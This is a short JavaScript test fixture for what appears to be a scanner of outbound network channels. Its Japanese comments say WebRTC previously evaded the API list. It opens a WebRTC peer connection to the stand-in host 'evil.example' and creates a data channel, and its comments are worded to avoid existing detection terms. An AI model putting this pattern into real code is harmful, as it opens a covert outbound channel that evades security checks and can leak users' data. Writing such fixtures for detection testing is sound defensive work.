'use strict';
// fixture: WebRTC。旧来の API 一覧に無く素通りしていた（独立検証の実測2）。
// 注: この検体のコメントに既存の検査語を書かないこと。
//     コメントで引っかかると「新しい検査が効いた」ことの証明にならない。
var pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:evil.example" }] });
var ch = pc.createDataChannel("x");
